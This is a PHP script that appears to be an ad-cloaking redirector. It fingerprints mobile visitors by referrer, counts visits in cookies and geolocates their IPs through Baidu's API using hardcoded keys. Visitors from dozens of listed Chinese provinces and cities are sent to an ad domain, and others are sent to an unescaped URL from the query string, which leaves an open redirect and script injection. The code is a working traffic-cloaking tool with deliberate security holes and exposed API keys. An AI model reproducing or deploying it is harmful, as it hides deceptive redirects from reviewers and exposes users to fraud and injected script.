<?php
set_time_limit(30);
error_reporting(0);
date_default_timezone_set("Asia/Shanghai");
header("cache-control:no-cache,must-revalidate");
header("Content-type: text/html; charset=utf-8");
$now = time();
$bj = $now - 6;
$ddo = get_domain();
require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
preg_match('#/(\w+)\.html#i', $_SERVER['HTTP_REFERER'],$mc);
if ($mc[0] === "/bf.html") {
    if ($detect->isMobile() && ((date("w") == "5") || (date("w") == "4") || (date("w") == "3") || (date("w") == "6") || (date("w") == "0") || (date("w") == "1") || (date("w") == "2")) == true) {
        if (isset($_COOKIE['url'])) {
            if ($bj > $_COOKIE['t']) {
                switch ($_COOKIE['url']) {
                    case 1:
                        ac();
                        break;

                    case 2:
                        ac();
                        break;

                    case 3:
                        cokit();
                        base();
                        break;

                    case 4:
                        ac();
                        break;

                    case 5:
                        ac();
                        break;

                    case 6:
                        ac();
                        break;

                    case 7:
                        cokit();
                        base();
                        break;

                    case 8:
                        ac();
                        break;

                    case 9:
                        ac();
                        break;

                    case 10:
                        ac();
                        break;

                    case 11:
                        cokit();
                        base();
                        break;

                    case 12:
                        ac();
                        break;

                    case 13:
                        ac();
                        break;

                    case 14:
                        ac();
                        break;

                    case 15:
                        cokit();
                        base();
                        break;

                    case 16:
                        ac();
                        break;

                    case 17:
                        cokit();
                        base();
                        break;

                    case 18:
                        ac();
                        break;

                    case 19:
                        ac();
                        break;

                    case 20:
                        ac();
                        break;

                    case 21:
                        cokit();
                        base();
                        break;

                    case 22:
                        ac();
                        break;

                    case 23:
                        ac();
                        break;

                    case 24:
                        cokit();
                        base();
                        break;

                    case 25:
                        ac();
                        break;

                    case 26:
                        ac();
                        break;

                    case 27:
                        cokit();
                        base();
                        break;

                    case 28:
                        cokit();
                        base();
                        break;

                    case 29:
                        ac();
                        break;

                    case 30:
                        ac();
                        break;

                    case 31:
                        cokit();
                        base();
                        break;

                    case 32:
                        ac();
                        break;

                    case 33:
                        ac();
                        break;

                    case 34:
                        cokit();
                        base();
                        break;

                    case 35:
                        ac();
                        break;
                } 
            } else {
                base();
            } //2
        } //1
        else {
            setcookie("url", "1", time() + 3600 * 24 * 2, "/", "$ddo", 0);
            setcookie("t", time() , time() + 3600 * 24 * 2, "/", "$ddo", 0);
            base();
        } 
    } else {
        base();
    } 
    exit();
} elseif ($mc[0] === "/ggko.html") {
    @include_once ("b.php");
} 
function get_domain() {
    $host =  $_SERVER["HTTP_HOST"];
    $host = strtolower($host);
    if (strpos($host, '/') !== false) {
        $parse = @parse_url($host);
        $host = $parse['host'];
    } 
    $topleveldomaindb = array('com',
        'edu',
        'gov',
        'int',
        'mil',
        'net',
        'org',
        'biz',
        'info',
        'pro',
        'name',
        'museum',
        'coop',
        'aero',
        'xxx',
        'idv',
        'mobi',
        'cc',
        'me'
        );
    $str = '';
    foreach ($topleveldomaindb as $v) {
        $str .= ($str ? '|' : '') . $v;
    } 
    $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
    if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
        $domain = $matchs['0'];
    } else {
        $domain = $host;
    } 
    return $domain;
} 
function cokit() {
    global $ddo;
    setcookie("url", $_COOKIE['url'] + 1, time() + 3600 * 24 * 2, "/", "$ddo", 0);
} 
function base() {
    $url = $_GET['url'];
    $url = rawurldecode($url);
    $url = str_replace('^', '.', $url);
    if ($url) {
        echo ("<script>var url_lii=document.referrer;var xx1=url_lii.indexOf('90vs.com');if(xx1>0){window.location.href='" . $url . "';}</script>");
    } 
} 
function is_city($str, $find) {
    $pos = strpos($str, $find);
    if ($pos === false) {
        return false;
    } else {
        return true;
    } 
} 
function ac() {
usleep(600000);
    // 第x次写cookie
    $aa = array("XDnoAKdX2a603o26ZzRoOXAD",
        "F454f8a5efe5e577997931cc01de3974",
        "5cf32b027c8927baa94c0fc655ab422a",
        "HQi0eHpVOLlRuIFlsTZNGlYvqLO56un3",
        "KcowYqyt2PUBGDWRL92Qovfj",
        "32f38c9491f2da9eb61106aaab1e9739"
        );
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $random_keys = array_rand($aa);
    $header = array("Connection: Keep-Alive",
        "Accept: text/html, application/xhtml+xml, */*",
        "Pragma: no-cache",
        "Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3",
        "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)",
        'CLIENT-IP:' . $ip,
        'X-FORWARDED-FOR:' . $ip
        );
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "https://api.map.baidu.com/location/ip?ak=$aa[$random_keys]&ip=$ip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 15);
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $data = curl_exec($curl);
    curl_close($curl);
    if (strlen($data) > 2) {
        $info = json_decode($data, true);
        if ($info['status'] == "0") {
            $prov = $info['content']['address_detail']['province'];
            $ct = $info['content']['address_detail']['city'];
            if ((is_city($ct, '重庆') || is_city($prov, '四川') || is_city($prov, '山西') || is_city($prov, '辽宁') || is_city($prov, '湖北') || is_city($ct, '张家口') || is_city($ct, '承德') || is_city($ct, '石家庄') || is_city($ct, '廊坊') || is_city($ct, '衡水') || is_city($ct, '邢台') || is_city($ct, '保定') || is_city($ct, '唐山') || is_city($ct, '秦皇岛') || is_city($prov, '河南') || is_city($prov, '宁夏') || is_city($prov, '青海') || is_city($prov, '湖南') || is_city($prov, '广西') || is_city($prov, '贵州') || is_city($prov, '江西') || is_city($prov, '海南') || is_city($prov, '山东') || is_city($prov, '江苏') || is_city($ct, '上海') || is_city($prov, '浙江') || is_city($prov, '吉林') || is_city($prov, '武汉') || is_city($prov, '银川') || is_city($prov, '黑龙江') || is_city($prov, '天津') || is_city($prov, '安徽') || is_city($prov, '甘肃') || is_city($prov, '陕西') || is_city($ct, '茂名') || is_city($ct, '湛江') || is_city($ct, '汕头') || is_city($ct, '潮州') || is_city($ct, '汕尾') || is_city($ct, '海丰') || is_city($ct, '珠海') || is_city($ct, '阳西') || is_city($ct, '阳江') || is_city($ct, '深圳') || is_city($ct, '宁德') || is_city($ct, '台山') || is_city($ct, '南平') || is_city($ct, '三明') || is_city($ct, '平潭') || is_city($ct, '福州') || is_city($ct, '龙岩') || is_city($ct, '阳东') || is_city($ct, '普宁') || is_city($ct, '惠州') || is_city($ct, '澳门') || is_city($ct, '厦门') || is_city($ct, '昆明') || is_city($ct, '玉溪') || is_city($ct, '昭通') || is_city($ct, '丽江') || is_city($ct, '大理') || is_city($ct, '普洱') || is_city($ct, '保山')) == true) {
                global $ddo;
                $cc = $_COOKIE['url'] + "1";
                setcookie("url", $cc, time() + 3600 * 24 * 2, "/", "$ddo", 0);
                setcookie("t", time() , time() + 3600 * 24 * 2, "/", "$ddo", 0);
                $urlx = $_GET['url'];
                if (strlen($urlx) > 15) {
                    echo ("<script>var url_lii=document.referrer;var xx1=url_lii.indexOf('90vs.com');if(xx1>0){window.location.href='https://juyunjie.com/?ad=jk';}</script>");
                } 
            } else {
                $url = $_GET['url'];
                $url = rawurldecode($url);
                $url = str_replace('^', '.', $url);
                if ($url) {
                    echo ("<script>var url_lii=document.referrer;var xx1=url_lii.indexOf('90vs.com');if(xx1>0){window.location.href='" . $url . "';}</script>");
                } 
            } 
        } else {
            $url = $_GET['url'];
            $url = rawurldecode($url);
            $url = str_replace('^', '.', $url);
            if ($url) {
                echo ("<script>var url_lii=document.referrer;var xx1=url_lii.indexOf('90vs.com');if(xx1>0){window.location.href='" . $url . "';}</script>");
            } 
        } 
    } else {
        $url = $_GET['url'];
        $url = rawurldecode($url);
        $url = str_replace('^', '.', $url);
        if ($url) {
            echo ("<script>var url_lii=document.referrer;var xx1=url_lii.indexOf('90vs.com');if(xx1>0){window.location.href='" . $url . "';}</script>");
        } 
    } 
} 

?>
